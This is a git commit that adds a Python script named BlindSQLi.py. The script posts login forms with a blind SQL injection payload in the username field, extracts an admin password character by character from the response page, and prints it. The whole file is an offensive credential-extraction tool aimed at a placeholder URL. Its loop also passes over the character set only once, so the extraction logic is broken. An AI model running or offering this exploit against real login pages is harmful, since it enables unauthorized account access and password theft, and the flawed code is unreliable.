e19bde13a077d96d12ef6b29fa7bf73689fafa8d
SaAbyy <94359910+SaAbyy@users.noreply.github.com>
2024-01-26 14:51:25 +0100

    Create BlindSQLi.py

---
+++ Scripts/BlindSQLi.py
@@ -0,0 +1,28 @@
+import requests
+from bs4 import BeautifulSoup
+
+url = 'http://xxxx.xxx'
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[{]}|;:,<.>/?'
+N = 1
+password = []
+
+for char in (chars):
+    login_data = {
+        'username': f"admin' and substr(password,{N},1)='{char}'--",
+        'password': "test"
+    }
+    response = requests.post(url, data=login_data)
+
+    if response.status_code == 200:
+        soup = BeautifulSoup(response.content, 'html.parser')
+        h2_title = soup.find('h2')
+        if h2_title and 'admin' in h2_title.text.lower():
+            print(f":{char}")
+            password.append(char)
+            N += 1
+        else:
+            continue
+    else:
+        print("Connexion failed")
+
+print("Password :","".join(password))
